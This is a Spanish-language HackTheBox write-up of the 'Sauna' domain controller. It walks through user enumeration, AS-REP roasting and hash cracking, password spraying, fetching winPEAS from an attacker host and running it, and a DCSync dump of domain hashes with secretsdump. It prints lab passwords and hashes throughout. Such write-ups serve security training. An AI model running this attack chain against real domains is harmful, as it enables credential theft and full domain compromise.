Propiedades:
- OS: Windows
- Plataforma: HackTheBox 
- Nivel: Easy
- Tags: #diccionario #username-anarchy #ldap #dcsync #bloodhound #ad #winpeas #pass-the-hash #asrep-roasting-attack

![](assets/Pasted%20image%2020260131002706.png)
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 10.129.95.180
PING 10.129.95.180 (10.129.95.180) 56(84) bytes of data.
64 bytes from 10.129.95.180: icmp_seq=1 ttl=127 time=89.3 ms

--- 10.129.95.180 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 89.297/89.297/89.297/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.95.180 -oG nmap/allPorts

Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49688,49697 -sV -sC -Pn -n -sS -vvv 10.129.95.180 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-31 12:15:39Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-31T12:16:31
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38495/tcp): CLEAN (Timeout)
|   Check 2 (port 21114/tcp): CLEAN (Timeout)
|   Check 3 (port 10224/udp): CLEAN (Timeout)
|   Check 4 (port 18510/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m28s
```

Por la informacion que tengo puedo intuir que estoy contra un `DC`.

- Puerto 80 HTTP
- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 389, 636 LDAP
- Puerto 5985 WinRm.

## Enumeración

### Puerto 80 HTTP.

La web es sobre un banco que quiere tu dinero (todos).

![](assets/Pasted%20image%2020260130231640.png)

En la tab de about tenemos una lista de los empleados:

![](assets/Pasted%20image%2020260130235201.png)

#### Tecnologias Web.

Por los headers podemos ver que la web corre sobre un IIS.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ curl -I http://egotistical-bank.local/
HTTP/1.1 200 OK
Content-Length: 32797
Content-Type: text/html
Last-Modified: Thu, 23 Jan 2020 17:14:44 GMT
Accept-Ranges: bytes
ETag: "4bdc4b9b10d2d51:0"
Server: Microsoft-IIS/10.0
Date: Sat, 31 Jan 2026 12:19:52 GMT
```

#### Fuzzing

Realice fuzzing para descubrir posibles directorios ocultos pero no encontré nada raro.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://egotistical-bank.local/FUZZ -e .git,.html,.asp,.js,.txt,.xml -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://egotistical-bank.local/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .git .html .asp .js .txt .xml
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 87ms]
index.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 174ms]
images                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 175ms]
contact.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Duration: 93ms]
blog.html               [Status: 200, Size: 24695, Words: 11588, Lines: 471, Duration: 92ms]
about.html              [Status: 200, Size: 30954, Words: 14043, Lines: 641, Duration: 864ms]
Images                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 95ms]
css                     [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 92ms]
Contact.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Duration: 90ms]
About.html              [Status: 200, Size: 30954, Words: 14043, Lines: 641, Duration: 114ms]
Index.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 98ms]
Blog.html               [Status: 200, Size: 24695, Words: 11588, Lines: 471, Duration: 88ms]
fonts                   [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 91ms]
IMAGES                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 92ms]
INDEX.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 107ms]
Fonts                   [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 89ms]
single.html             [Status: 200, Size: 38059, Words: 20403, Lines: 685, Duration: 91ms]
```

### Puerto 445 SMB.

Primero saque informacion general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb 10.129.95.180
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

- Dominio **EGOTISTICAL-BANK.LOCAL** y nombre **SAUNA**.

Voy a colocarlo en el /etc/hosts.

```bash
10.129.95.180 SAUNA EGOTISTICAL-BANK.LOCAL SAUNA.EGOTISTICAL-BANK.LOCAL
```

Trate de enumerar los shares pero no tuve éxito:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb egotistical-bank.local -u '' -p '' --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
SMB         10.129.95.180   445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb egotistical-bank.local -u 'guest' -p '' --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

### Puerto 636 LDAP.

Al enumerar LDAP me pude dar cuenta de un usuario llamado **Hugo Smith**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ ldapsearch -x -H ldap://10.129.95.180 -b "dc=egotistical-bank,dc=local" > ldap.content

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

Puedo comprobar que este usuario existe con kerbrute:

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ ./kerbrute userenum -d egotistical-bank.local --dc 10.129.95.180 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/31/26 - Ronnie Flathers @ropnop

2026/01/31 05:36:05 >  Using KDC(s):
2026/01/31 05:36:05 >   10.129.95.180:88

2026/01/31 05:36:05 >  [+] VALID USERNAME:       hsmith@egotistical-bank.local
2026/01/31 05:36:05 >  Done! Tested 4 usernames (1 valid) in 0.223 seconds
```

## Acceso Inicial.

Al no tener mucha informacion puedo tratar de crear un diccionario de usuarios en base a los nombres de los empleados encontrados en la web. Esto lo puedo hacer utilizando [username-anarchy](https://github.com/urbanadventurer/username-anarchy) y un diccionario con los nombres de los empleados.

```bash
┌──(wndr㉿wndr)-[~/Tools/username-anarchy]
└─$ ./username-anarchy -i ~/Machines/hackthebox/sauna/names.txt
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
smithf
smith
smith.f
smith.fergus
fs
hugo
hugobear
hugo.bear
hugob
h.bear
hbear
bhugo
b.hugo
bearh
bear
bear.h
bear.hugo
hb
steven
stevenkerb
steven.kerb
stevenke
stevkerb
stevenk
s.kerb
skerb
ksteven
k.steven
kerbs
kerb
kerb.s
kerb.steven
sk
shaun
shauncoins
shaun.coins
shauncoi
shaucoin
shaunc
s.coins
scoins
cshaun
c.shaun
coinss
coins
coins.s
coins.shaun
sc
bowie
bowietaylor
bowie.taylor
bowietay
bowitayl
bowiet
b.taylor
btaylor
tbowie
t.bowie
taylorb
taylor
taylor.b
taylor.bowie
bt
sophie
sophiedriver
sophie.driver
sophiedr
sophdriv
sophied
s.driver
sdriver
dsophie
d.sophie
drivers
driver
driver.s
driver.sophie
sd
```

Este diccionario lo puedo utilizar con kerbrute para validar usuarios:

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ ./kerbrute userenum -d egotistical-bank.local --dc 10.129.95.180 ~/Machines/hackthebox/sauna/users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/31/26 - Ronnie Flathers @ropnop

2026/01/31 05:49:51 >  Using KDC(s):
2026/01/31 05:49:51 >   10.129.95.180:88

2026/01/31 05:49:51 >  [+] VALID USERNAME:       fsmith@egotistical-bank.lo
```

- fsmith es un usuario valido.


Ahora que tenemos 2 usuarios puedo tratar de realizar un AS-REP Roasting Attack, este ataque se aprovecha del PreAuth deshabilitado.

- Es decir, un atacante puede enviar una solicitud de autenticación (**AS-REQ**) a Kerberos **sin necesidad de conocer ni enviar la contraseña** del usuario.  
Si el **Pre-Authentication está deshabilitado**, Kerberos responde con un **AS-REP que contiene información cifrada con una clave derivada de la contraseña del usuario**, la cual puede ser **extraída y crackeada offline**, exponiendo la contraseña.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ impacket-GetNPUsers egotistical-bank.local/ -no-pass -usersfile real-users.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fa8e92c5a8738c3217f7324940d24818$cd36c4c65f1b048bdc00155c1d0f1475a5458e1ac4e8ed4780c9a928f1c1507254e2b0222e4deab06070541efe2c1d480de8644bd33d01e902d90e21fb1ca254ccd5ff8c2318d31aaf1080acc6621acf18178c96d8ee4b868b662f528f302a2e79f936db4e32bb7f553b12975a80d5977508f29f338b265982306ffc80fce3288ac8f8d4511e84e3b2ef426a721b03fc1a43a1a677318cb7bcd522a4ded298113405908f7cc5ce99707e9bdd7f3e69aa4730678bd489ea0e2bf7836813784747a3805ad0c3f366ecffed4f997a2ab62d42521994a043e4dd5f9e52f1b78e58e035effbc8f0f1e22508983481d60add2f4eced79b21820d6d5bcdc55e0d190890
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

- Obtuvimos un hash crackeable para el usuario fsmith

Puedo crackear este hash con `hashcat`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fa8e92c5a8738c3217f7324940d24818$cd36c4c65f1b048bdc00155c1d0f1475a5458e1ac4e8ed4780c9a928f1c1507254e2b0222e4deab06070541efe2c1d480de8644bd33d01e902d90e21fb1ca254ccd5ff8c2318d31aaf1080acc6621acf18178c96d8ee4b868b662f528f302a2e79f936db4e32bb7f553b12975a80d5977508f29f338b265982306ffc80fce3288ac8f8d4511e84e3b2ef426a721b03fc1a43a1a677318cb7bcd522a4ded298113405908f7cc5ce99707e9bdd7f3e69aa4730678bd489ea0e2bf7836813784747a3805ad0c3f366ecffed4f997a2ab62d42521994a043e4dd5f9e52f1b78e58e035effbc8f0f1e22508983481d60add2f4eced79b21820d6d5bcdc55e0d190890

:Thestrokes23
```

- Al parecer la contraseña es Thestrokes23.

Puedo probar estas credenciales en distintos servicios:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb egotistical-bank.local -u fsmith -p Thestrokes23
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23

┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc winrm egotistical-bank.local -u fsmith -p Thestrokes23
WINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

- Las credenciales son validas para SMB Y WinRm.

Ahora puedo extraer todos los usuarios via SMB:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb egotistical-bank.local -u fsmith -p Thestrokes23 --users
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
SMB         10.129.95.180   445    SAUNA            -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.95.180   445    SAUNA            Administrator                 2021-07-26 16:16:16 0       Built-in account for administering the computer/domain
SMB         10.129.95.180   445    SAUNA            Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.95.180   445    SAUNA            krbtgt                        2020-01-23 05:45:30 0       Key Distribution Center Service Account
SMB         10.129.95.180   445    SAUNA            HSmith                        2020-01-23 05:54:34 1
SMB         10.129.95.180   445    SAUNA            FSmith                        2020-01-23 16:45:19 0
SMB         10.129.95.180   445    SAUNA            svc_loanmgr                   2020-01-24 23:48:31 0
SMB         10.129.95.180   445    SAUNA            [*] Enumerated 6 local users: EGOTISTICALBANK
```

También puedo tratar de sprayear la contraseña para ver si algun otro usuarios tiene la misma contraseña.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb egotistical-bank.local -u content/users.txt -p Thestrokes23 --continue-on-success
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Administrator:Thestrokes23 STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Guest:Thestrokes23 STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\krbtgt:Thestrokes23 STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\HSmith:Thestrokes23
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\FSmith:Thestrokes23
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Thestrokes23 STATUS_LOGON_FAILURE
```

- Fsmith y Hsmith tienen la misma password.

Al tener credenciales puedo utilizar `bloodhound`.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Para eso primero tenemos que utilizar un **Ingestor** que se va a encargar de recopilar la data del dominio. Yo utilice `rusthound-ce`

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ ./rusthound-ce -d egotistical-bank.local -u fsmith@egotistical-bank.local -p Thestrokes23 -z
---------------------------------------------------
Initializing RustHound-CE at 06:03:12 on 01/31/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-01-31T06:03:12Z INFO  rusthound_ce] Verbosity level: Info
[2026-01-31T06:03:12Z INFO  rusthound_ce] Collection method: All
[2026-01-31T06:03:13Z INFO  rusthound_ce::ldap] Connected to EGOTISTICAL-BANK.LOCAL Active Directory!
[2026-01-31T06:03:13Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-01-31T06:03:13Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-31T06:03:14Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=EGOTISTICAL-BANK,DC=LOCAL
[2026-01-31T06:03:14Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-31T06:03:17Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
[2026-01-31T06:03:17Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-31T06:03:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
[2026-01-31T06:03:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-31T06:03:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
[2026-01-31T06:03:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-31T06:03:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
[2026-01-31T06:03:20Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-01-31T06:03:20Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-01-31T06:03:20Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 7 users parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-01-31T06:03:20Z INFO  rusthound_ce::json::maker::common] .//20260131060320_egotistical-bank-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 06:03:20 on 01/31/26! Happy Graphing!
```
## Escalada de Privilegios.

Antes de enumerar el dominio usando `bloodhound` voy a conectarme por WinRm para enumerar la maquina internamente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ evil-winrm-py -i 10.129.95.180 -u fsmith -p Thestrokes23
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.95.180:5985' as 'fsmith'
evil-winrm-py PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

Obtengo la primera flag en el directorio Desktop.

```bash
evil-winrm-py PS C:\Users\FSmith\Desktop> type user.txt
8581d9de8a7f3567ae77***
```

No encontré nada manualmente por lo cual opte por utilizar `winpeas`

```bash
evil-winrm-py PS C:\Users\FSmith\Downloads> Invoke-WebRequest -Uri http://10.10.16.57/winPEASx64.exe -Outfile winpeas.exe
evil-winrm-py PS C:\Users\FSmith\Downloads> ls

evil-winrm-py PS C:\Users\FSmith\Downloads> .\winpeas.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

- Winpeas encontró las credenciales  svc_loanmanager / Moneymakestheworldgoround!.

Inicialmente la contraseña no me sirvió, por lo cual opte por sprayearla. 

- La contraseña no me servía por que el usuario no era svc_loanmanager si no mas bien svc_loanmgr.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc smb egotistical-bank.local -u content/users.txt -p 'Moneymakestheworldgoround!' --continue-on-success
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Administrator:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Guest:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\krbtgt:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\HSmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\FSmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
```

Estas credenciales también me sirven para conectarme via WinRm:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ nxc winrm egotistical-bank.local -u svc_loanmgr -p 'Moneymakestheworldgoround!'
WINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```


### Abusando de DCSync.

Al echarle un vistazo a `bloodhound` para ver si mi usuario **svc_loanmgr** tiene permisos sobre otros objetos puedo ver lo siguiente:

- **svc_loanmgr** tiene permisos de DCSync sobre el DC.

![](assets/Pasted%20image%2020260131001952.png)

DCSync es un conjunto de permisos que suele darse a `DCs` y que les permite replicar toda la informacion del dominio incluidas las credenciales.

Podemos usar `impacket-secretsdump` para extraer las credenciales del dominio.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/sauna]
└─$ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'sauna.egotistical-bank.local'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ca1be576d9f27c46fea4220f3a51f9db:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
